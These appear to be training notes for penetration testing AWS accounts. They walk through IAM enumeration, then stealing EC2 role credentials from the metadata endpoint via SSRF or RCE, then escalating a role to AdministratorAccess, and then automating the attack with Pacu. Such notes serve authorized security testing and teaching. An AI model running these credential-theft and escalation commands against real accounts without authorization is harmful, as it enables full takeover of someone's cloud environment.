# AWS by CyberWarfare Labs  Notes

Simple notes on how to approach an AWS pentest, step by step. Written so a junior pentester can just follow along, run the command, see what it gives, and know what to do next.

## First, a quick idea of what you're dealing with

AWS has a LOT of services, but for pentesting you mostly care about a handful:

* **IAM** – who can log in, and what they're allowed to do. This is basically the heart of AWS security.
* **EC2** – virtual machines/servers.
* **S3** – file storage (buckets).
* **Lambda** – small pieces of code that run on their own.
* **RDS** – databases.
* **VPC** – the networking layer.

Everything you do in AWS — clicking in the console, running a CLI command, an app calling an API — goes through IAM first. IAM checks "is this identity allowed to do this action on this resource?" If yes, it happens. If no, it's denied. That's it. Understand this and most of AWS pentesting starts making sense.

**Users, Groups, Roles, Policies — what's the difference?**

* A **user** is a person/app with a login (username+password or access keys).
* A **group** is just a bunch of users bundled together so you can give them the same permissions in one place.
* A **role** is not tied to a person — it's something that gets "assumed" temporarily, usually by a service like EC2 or Lambda, or by another trusted user.
* A **policy** is the actual document (JSON) that says what's allowed or denied. Policies get attached to users, groups, or roles.

**Two kinds of credentials:**

* **Long-term** — Access Key ID + Secret Key. Doesn't expire on its own. Used with `aws configure`.
* **Short-term** — Access Key ID + Secret Key + Session Token. Expires after a while. You get these from assuming a role, SSO, or (important for us) the EC2 metadata service.

That's basically all the background you need. Let's get into the actual workflow.

{% stepper %}
{% step %}
## Set up your access

Whatever credentials you land with (given by the client, or found during the test), load them into the CLI as their own profile. Don't dump them into `default`, keep things separate.

```bash
aws configure --profile auditor
```

It'll ask for Access Key ID, Secret Key, region, output format — just fill it in.

**Check who you actually are before doing anything else:**

```bash
aws sts get-caller-identity --profile auditor
```

This tells you your username/role ARN and account number. Always run this first — you want to know exactly what identity you're operating as before you start poking around.

**What to find here:** your Arn (tells you if you're a user or a role), and the Account ID (confirms you're in the right AWS account).

**Next step →** start enumerating.
{% endstep %}

{% step %}
## Enumerate IAM

Start broad, then drill down.

**List everything first:**

```bash
aws iam list-users --profile auditor
aws iam list-groups --profile auditor
aws iam list-roles --profile auditor
aws iam list-policies --profile auditor
```

**What to find here:** interesting names — things like `admin`, `backup`, `ec2-role`, `lambda-role`, `jump-ec2-role` are worth a closer look. Also note how many users/roles exist, it gives you a sense of the account's size and structure.

**Next step →** for any user/group/role that looks interesting, check what permissions it actually has.

**For a specific user:**

```bash
aws iam list-groups-for-user --user-name <user-name> --profile auditor
aws iam list-attached-user-policies --user-name <user-name> --profile auditor
aws iam list-user-policies --user-name <user-name> --profile auditor
```

**For a specific group:**

```bash
aws iam get-group --group-name <group-name> --profile auditor
aws iam list-attached-group-policies --group-name <group-name> --profile auditor
aws iam list-group-policies --group-name <group-name> --profile auditor
```

**For a specific role:**

```bash
aws iam list-attached-role-policies --role-name <role-name> --profile auditor
aws iam list-role-policies --role-name <role-name> --profile auditor
```

**What to find here:** the policy names attached. `list-attached-*` shows managed policies (reusable ones), `list-*-policies` shows inline policies (custom, one-off ones written just for that identity). Both matter.

**Next step →** actually read what's inside those policies.

```bash
# Managed policy content
aws iam get-policy --policy-arn <policy-arn> --profile auditor
aws iam list-policy-versions --policy-arn <policy-arn> --profile auditor
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id> --profile auditor

# Inline policy content
aws iam get-user-policy  --user-name  <name> --policy-name <policy-name> --profile auditor
aws iam get-group-policy --group-name <name> --policy-name <policy-name> --profile auditor
aws iam get-role-policy  --role-name  <name> --policy-name <policy-name> --profile auditor
```

**What to find here:** look at the actual JSON — the `Effect`, `Action`, and `Resource` fields. This is the moment you find misconfigurations. Red flags to look for:

* `"Action": "*"` with `"Resource": "*"` → basically full admin, huge finding.
* `iam:PassRole` combined with `ec2:RunInstances` or `lambda:CreateFunction` → often leads to privilege escalation.
* `iam:AttachRolePolicy`, `iam:PutRolePolicy`, `iam:CreatePolicyVersion` → this identity can give itself more permissions.

**Next step →** enumerate the actual cloud resources (not just identities).

```bash
aws ec2 describe-instances --profile auditor
```

Same pattern works for other services (`aws s3api list-buckets`, `aws rds describe-db-instances`, etc.) — swap the service name and use `list-*` or `describe-*`.

**What to find here:** running EC2 instances, their public IPs, attached IAM roles (this is important for the next step), S3 bucket names, databases, etc. Basically a map of what's actually deployed.
{% endstep %}

{% step %}
## Get initial access through a vulnerable app

A very common real-world path: you find a web app running on an EC2 instance that has an SSRF or RCE bug. Instead of just stopping at "found SSRF," you push further and hit AWS's internal metadata service, which every EC2 instance can reach:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

If the instance has an IAM role attached (and most do), this endpoint just hands you temporary credentials for that role — Access Key ID, Secret Key, and Session Token. No login needed, just SSRF/RCE access to the box.

**What to find here:** the role name attached to the instance (you'll usually need to hit the endpoint once without a role name to see what's available, then again with the name to get the actual keys).

**Next step →** load those stolen credentials and start using them.

```bash
aws configure set aws_access_key_id     <key-id>  --profile ec2
aws configure set aws_secret_access_key <secret>  --profile ec2
aws configure set aws_session_token     <token>   --profile ec2
aws sts get-caller-identity --profile ec2
```

> Only do this against a target you're actually authorized to test. Hitting metadata endpoints without permission is not okay.
{% endstep %}

{% step %}
## Check what this new identity can do, then try to escalate

Now that you're this EC2 role, go back to Step 2's approach and check its own permissions:

```bash
aws iam list-attached-role-policies --role-name <role-name> --profile auditor
aws iam list-role-policies --role-name <role-name> --profile auditor
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name> --profile auditor
```

**What to find here:** same red flags as before — specifically look for the ability to attach or modify its own policies.

If you find that, escalate:

```bash
aws iam attach-role-policy \
  --role-name <role-name> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile ec2
```

**Next step →** confirm it actually worked.

```bash
aws iam list-attached-role-policies --role-name <role-name> --profile auditor
```

If `AdministratorAccess` shows up now, you've gone from "compromised web app" to "full admin over the AWS account." That's the whole story you'll be putting in the report.
{% endstep %}

{% step %}
## Do all of this faster with Pacu

Everything above can be done manually, which is good to learn first so you actually understand what's happening. But once you get the hang of it, **Pacu** does most of this for you automatically. It's an open-source AWS exploitation framework (built by Rhino Security Labs) made specifically for this kind of testing.

### Getting started with Pacu

Install it, then just run `pacu` to get into its console. It works like Metasploit — you set your keys, then run modules.

**Load your credentials into Pacu:**

```
set_keys
```

It'll ask for the Access Key ID, Secret Key, and (if you have it) Session Token — same values you'd normally put into `aws configure`.

**Check what your current identity can do:**

```
exec iam__enum_permissions
whoami
```

This is the Pacu equivalent of manually going through every `list-attached-*-policies` command — it does it all at once and gives you a clean summary of your actual permissions.

**Enumerate EC2 instances:**

```
exec ec2__enum
data EC2
```

This pulls all EC2 instances and their public IPs — useful for finding other machines to pivot to, or confirming what you found manually in Step 2.

**Find and use privilege escalation paths automatically:**

```
exec iam__privesc_scan
```

This is the big one. Pacu checks your current permissions against a known list of AWS privilege escalation techniques (there are around 20+ known methods — attaching policies, creating access keys for other users, updating assume-role policies, etc.) and tells you which ones you qualify for. If you give it the go-ahead, it can even attempt the escalation automatically.

**After escalating, confirm your new permission level:**

```
exec iam__enum_permissions
whoami
```

### Why bother with Pacu at all if you already know the manual commands?

Because in a real account with hundreds of users, roles, and policies, manually checking each one for privesc potential takes forever. Pacu automates the boring enumeration and checks it against a huge list of known attack paths in seconds. Use manual AWS CLI commands when you want precision and to double-check something specific — use Pacu when you want speed and coverage.
{% endstep %}
{% endstepper %}

## The overall attack flow, summarized

```
Recon → get initial creds → enumerate IAM → find a role/user with too much access
   → escalate privileges → enumerate resources with new access → extract data/impact → clean up
```

Every step above maps onto this. Steps 1–2 are recon, Step 3 is initial access, Step 4 (or Pacu in Step 5) is escalation, and after that you'd move into looking at S3 buckets, databases, etc. with your new admin access.

_Notes based on CyberWarFare Labs' Multi-Cloud Red Team Analyst (MCRTA) — AWS training material._
